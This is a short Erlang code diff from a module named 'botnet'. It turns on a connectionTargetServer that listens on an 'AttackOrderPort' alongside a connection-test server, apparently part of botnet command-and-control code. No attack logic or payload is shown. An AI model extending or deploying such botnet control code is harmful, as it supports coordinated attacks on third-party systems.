@@ -32,6 +32,5 @@ do_recv(Sock, Bs) ->
     end.
 
 start(TestPort, AttackOrderPort) ->
-    A = spawn(botnet, connectionTestServer, [TestPort]),
-    A.
-    % spawn(botnet, connectionTargetServer, [AttackOrderPort]).
+    spawn(botnet, connectionTestServer, [TestPort]),
+    spawn(botnet, connectionTargetServer, [AttackOrderPort]).
